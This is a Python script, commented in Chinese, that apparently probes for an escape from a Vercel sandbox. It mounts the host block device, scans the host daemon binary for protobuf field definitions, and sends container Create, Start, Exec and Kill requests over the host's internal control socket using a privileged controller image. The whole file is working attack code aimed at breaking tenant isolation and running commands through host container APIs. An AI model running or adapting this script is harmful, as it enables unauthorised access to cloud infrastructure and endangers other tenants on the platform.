# -*- coding: utf-8 -*-
"""vda25_light_desc: 轻量 descriptor 挖掘 + json Exec 存活窗口测试
P0: 流式 gzip 扫描 (限 40 blob x 64KB) 挖 ExecRequest/CreateRequest/StreamOutputRequest 字段定义
P1: Create(attach) -> Start -> 立即 json Exec (无半关闭, 20s) 窗口测试
P2: 若 P0 得字段定义, gRPC Exec 精确构造
P3: Process StreamOutput
输出落盘 + 哨兵 V25L_DONE"""
import os, time, socket, ctypes, re, struct, gzip

OUT = '/vercel/sandbox/v25l.out'
os.makedirs('/vercel/sandbox', exist_ok=True)
f = open(OUT, 'w', encoding='utf-8', errors='replace')


def log(s):
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def rpc_raw(sockpath, path, body, ctype, t=6, shutdown_wr=False, te=None):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sockpath)
        if isinstance(body, str):
            body = body.encode()
        hdr = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: %s\r\n'
               'Content-Length: %d\r\nConnection: close\r\n' % (path, ctype, len(body)))
        if te:
            hdr += 'TE: %s\r\n' % te
        hdr += '\r\n'
        s.sendall(hdr.encode() + body)
        if shutdown_wr:
            try:
                s.shutdown(socket.SHUT_WR)
            except Exception:
                pass
        data = b''
        while True:
            try:
                chunk = s.recv(16384)
            except socket.timeout:
                break
            if not chunk:
                break
            data += chunk
        s.close()
        if not data:
            return 'NORESP', ''
        head, _, rest = data.partition(b'\r\n\r\n')
        return head.split(b'\r\n')[0].decode(errors='replace'), rest[:1500].decode(errors='replace')
    except Exception as e:
        return 'EXC:%s' % type(e).__name__, ''


def grpc_env(payload):
    return b'\x00' + struct.pack('>I', len(payload)) + payload


def pstr(field_no, s):
    b = s.encode()
    tag = (field_no << 3) | 2
    out = bytearray()
    while tag > 127:
        out.append((tag & 127) | 128)
        tag >>= 7
    out.append(tag)
    l = len(b)
    while l > 127:
        out.append((l & 127) | 128)
        l >>= 7
    out.append(l)
    return bytes(out) + b


def pbool(field_no, v):
    tag = (field_no << 3) | 0
    out = bytearray()
    while tag > 127:
        out.append((tag & 127) | 128)
        tag >>= 7
    out.append(tag)
    out.append(1 if v else 0)
    return bytes(out)


def stream_scan_gzip(data, max_blobs=40, limit=65536):
    """流式解压 gzip blob, 找包含目标消息名的完整 blob"""
    targets = [b'ExecRequest', b'CreateRequest', b'StreamOutputRequest', b'StartRequest', b'containers.ExecRequest']
    found = []
    idx = 0
    tries = 0
    while tries < max_blobs:
        i = data.find(b'\x1f\x8b\x08', idx)
        if i < 0:
            break
        idx = i + 3
        tries += 1
        try:
            d = gzip.decompressobj()
            head = d.decompress(data[i:i + 256], 256)
            if not head:
                continue
            # 特征检查: protobuf descriptor 通常含 'proto3' 或消息名
            chunk = head
            off = i + 256
            while len(chunk) < limit and off < len(data):
                piece = d.decompress(data[off:off + 8192], 8192)
                if not piece:
                    break
                chunk += piece
                off += 8192
                if b'proto3' in chunk or b'message' in chunk:
                    break
            for t in targets:
                if t in chunk:
                    # 完整解压
                    try:
                        full = gzip.decompress(data[i:i + 2000000])
                    except Exception:
                        full = chunk
                    found.append((i, len(full), full))
                    log('BLOB off=%d size=%d target=%s' % (i, len(full), t.decode(errors='replace')))
                    break
        except Exception:
            continue
        if len(found) >= 3:
            break
    return found


def extract_fields(txt, msgname):
    """从 descriptor 文本提取消息字段: name / number / type"""
    out = []
    for m in re.finditer(r'name:"%s"' % msgname, txt):
        seg = txt[m.start():m.start() + 4000]
        fields = re.findall(r'name:"([a-z_0-9]+)" number:([0-9]+) label:LABEL_OPTIONAL type:TYPE_([A-Z_]+)', seg)
        out.append(fields)
        break
    return out


def main():
    MOUNTED = False
    try:
        for ln in open('/proc/self/mountinfo', errors='replace'):
            if '/mnt/vdax' in ln:
                MOUNTED = True
                break
    except Exception:
        pass
    if not MOUNTED:
        os.makedirs('/mnt/vdax', exist_ok=True)
        ret = ctypes.CDLL(None).mount(b'/dev/vda', b'/mnt/vdax', b'xfs', 0, b'')
        log('mount ret=%d' % ret)

    sp = '/mnt/vdax/run/cell/cell.sock'
    IMG = '977805900156.dkr.ecr.us-east-1.amazonaws.com/sandbox-controller@sha256:95fd06013f4e1708be914dc973663ab50e48d0045087340cc71cf903e2841b59'
    CSVC = '/vercel.hive.cell.api.containers.v1.ContainersService'
    PSVC = '/vercel.hive.cell.api.processes.v1.ProcessService'

    # P0: 轻量 descriptor 挖掘
    log('=== P0 light descriptor scan ===')
    try:
        data = open('/mnt/vdax/opt/vercel/celld', 'rb').read()
        blobs = stream_scan_gzip(data)
        log('blobs found: %d' % len(blobs))
        for i, ln, full in blobs:
            txt = full.decode('utf-8', errors='replace')
            for msg in ['ExecRequest', 'CreateRequest', 'StreamOutputRequest', 'StartRequest']:
                defs = extract_fields(txt, msg)
                if defs:
                    log('== %s: %s' % (msg, defs[0]))
    except Exception as e:
        log('P0 ERR %s' % e)

    # P1: attach 保活 + json Exec 窗口
    log('=== P1 json Exec window ===')
    st, bd = rpc_raw(sp, CSVC + '/Create', '{"image":"%s","command":"/bin/sleep 300","attach":true}' % IMG,
                     'application/json', t=30)
    m = re.search(r'"containerId":\s*"([^"]+)"', bd)
    if not m:
        log('NO CID - abort')
        log('V25L_DONE')
        f.close()
        return
    cid = m.group(1)
    log('CID=%s' % cid)
    st, bd = rpc_raw(sp, CSVC + '/Start', '{"container_id":"%s"}' % cid, 'application/json', t=6)
    log('start -> %s | %s' % (st, bd[:150]))
    # 立即 json Exec (无半关闭, 20s)
    st, bd = rpc_raw(sp, CSVC + '/Exec', '{"container_id":"%s","command":"id"}' % cid,
                     'application/json', t=20)
    log('exec json -> %s | %s' % (st, bd[:400].replace('\n', ' ')))
    # 立即 gRPC Exec (cn=9,mn=1 组合 + 半关闭)
    st, bd = rpc_raw(sp, CSVC + '/Exec', grpc_env(pstr(9, cid) + pstr(1, 'id')),
                     'application/grpc', t=8, shutdown_wr=True, te='trailers')
    log('exec grpc f9,f1 -> %s | %s' % (st, bd[:300].replace('\n', ' ')))
    # gRPC Exec f9 only
    st, bd = rpc_raw(sp, CSVC + '/Exec', grpc_env(pstr(9, cid)),
                     'application/grpc', t=8, shutdown_wr=True, te='trailers')
    log('exec grpc f9 -> %s | %s' % (st, bd[:300].replace('\n', ' ')))

    # P2: Kill 确认状态
    st, bd = rpc_raw(sp, CSVC + '/Kill', '{"container_id":"%s"}' % cid, 'application/json', t=4)
    log('kill -> %s | %s' % (st, bd[:150]))

    log('V25L_DONE')
    f.close()


if __name__ == '__main__':
    main()
